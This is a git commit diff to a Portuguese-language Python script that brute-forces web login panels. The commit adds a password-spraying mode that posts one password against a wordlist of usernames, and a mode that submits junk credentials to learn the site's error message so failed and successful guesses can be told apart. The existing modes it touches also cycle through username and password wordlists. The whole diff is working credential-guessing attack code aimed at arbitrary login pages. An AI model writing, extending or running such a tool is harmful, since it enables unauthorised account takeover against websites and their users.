1944d86cf336f7583e84de0d506129acfc860309
Mr-Zk_exe <78140321+MrZkexe@users.noreply.github.com>
2021-02-03 06:53:22 -0300

    Update btf.py

--- btf.py
+++ btf.py
@@ -5,7 +5,8 @@ import time
 import os
 
 try:
-	#funcoes
+
+
 	def userpass():
 		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser ou Email WordList:\033[1;32m users.txt\n \033[1;33mSenhas Wordlist:\033[1;32m pass.txt\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")
 
@@ -32,6 +33,7 @@ try:
 				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pws))
 			else:
 				print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pws))
+
 	def passs():
 		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser:\033[1;32m joaozinho\n \033[1;33mSenhas Wordlist:\033[1;32m pass.txt\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")
 
@@ -56,6 +58,43 @@ try:
 				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(user, pws))
 			else:
 				print("\033[1;92mUser: {} senha: {} Quebro :)".format(user, pws))
+	
+	def usu():
+		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n \033[1;33mUser ou Email WordList:\033[1;32m users.txt\n \033[1;33mSenha:\033[1;32m senha\n \033[1;33mQuando da Error:\033[1;32m error no login da bata user 10\n\n")
+
+		url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
+		userdata = input('\033[1;32musuario data: \033[1;31m')
+		passdata = input('\033[1;32msenha data: \033[1;31m')
+		user = input('\033[1;32mUser ou Email WordList: \033[1;31m')
+		pw = input('\033[1;32mSenhas: \033[1;31m')
+	 
+		diruser = 'WL-user/' + user 
+		file_user = open(diruser)
+
+		error = input('\033[1;32mQuando da Error: \033[1;31m')
+		for uss in file_user.readlines():
+			
+			uss = uss.rstrip('\n')
+			inf = {userdata : uss, passdata : pw}
+			rs = requests.post(url, data=inf)
+			
+			if error in str(rs.text):
+				print("\033[1;31mUser: {} senha: {} Não Quebrada :(".format(uss, pw))
+			else:
+				print("\033[1;92mUser: {} senha: {} Quebro :)".format(uss, pw))
+
+	def error():
+		print("\033[1;32m Exemplo:\n \033[1;33mlink do painel de login M-POST:\033[1;32m https://www.zkexe.com/login.php\n \033[1;33musuario data:\033[1;32m usuario\n \033[1;33msenha data:\033[1;32m senha\n")
+
+		url = input('\033[1;32mlink do painel de login M-POST: \033[1;31m')
+		userdata = input('\033[1;32musuario data: \033[1;31m')
+		passdata = input('\033[1;32msenha data: \033[1;31m')
+		inf = {userdata : 'jbxzjcbdsjbcjdsbcjdbsbcjsdbcbsdjcb', passdata : 'jbxzjcbdsjbcjdsbcjdbsbcjsdbcbsdjcb'}
+		rs = requests.post(url, data=inf)
+
+		print(rs.text)
+		init()
+
 	def init():
 		print('\033[1;31m ╔╗ ╔╗╔═╗╔╦═╗ ╔╗╔╗      ╔════╦╗╔═╗ ')
 		print(' ║║╔╝╚╣╔╝║║║╚╗║║║║      ╚══╗═║║║╔╝ ')
@@ -64,20 +103,26 @@ try:
 		print(' ║╚╝║╚╣║╚╝║║ ║║║║╚╝║╚═╝║╔╝═╚═╣║║╚╗ ')
 		print(' ╚══╩═╩╩══╩╝ ╚═╝╚══╩═╗╔╝╚════╩╝╚═╝ ')
 		print('                   ╔═╝║            ')
-		print('                   ╚══╝          v3\n')
+		print('                   ╚══╝       v3.5\n')
 		print('\033[1;32mscript Feito por \033[1;31mMr-ZK_EXE\n')
-		print('\033[1;32mOpcões\n\n\033[1;33mdigite\n1 para pegar user e senha\n2 para quebrar senha se ja sabe o usuario\n')
+		print('\033[1;32mOpcões\n\n\033[1;33mdigite\n1 para pegar user e senha\n2 para quebrar senha se ja sabe o usuario\n3 para quebrar usuario se ja sabe o senha\n4 pegar o erro\n')
+		
 		ops = int(input('Numero: \033[1;31m'))
 		if(ops == 1):
 			print('usuario e senha')
 			userpass()
 		elif(ops == 2):
 			passs()
+		elif(ops == 3):
+			usu()
+		elif(ops == 4):
+			error()
 		else:
 			print('Numero invalido')
 			time.sleep(2)
 			os.system('cls' if os.name == 'nt' else 'clear')
 			init()
+
 	init()
 except KeyboardInterrupt:
 	print('\033[1;31m \nVoce me fecho babaca :(')
